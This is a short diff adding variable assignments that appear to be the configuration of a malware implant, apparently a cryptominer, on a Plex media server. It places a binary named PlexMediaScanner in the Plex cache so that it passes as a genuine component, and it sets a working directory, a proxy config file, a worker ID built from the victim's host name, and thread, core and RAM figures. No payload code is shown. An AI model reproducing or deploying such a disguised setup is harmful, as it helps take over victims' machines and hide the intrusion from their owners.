@@ -1,0 +1,8 @@
+W=/var/tmp
+B=/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache
+CFG=plex_exp_proxy.json
+WID=P_<victim-host>_<id>
+BIN=/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner
+THREADS=14
+CORES=16
+RAM=31
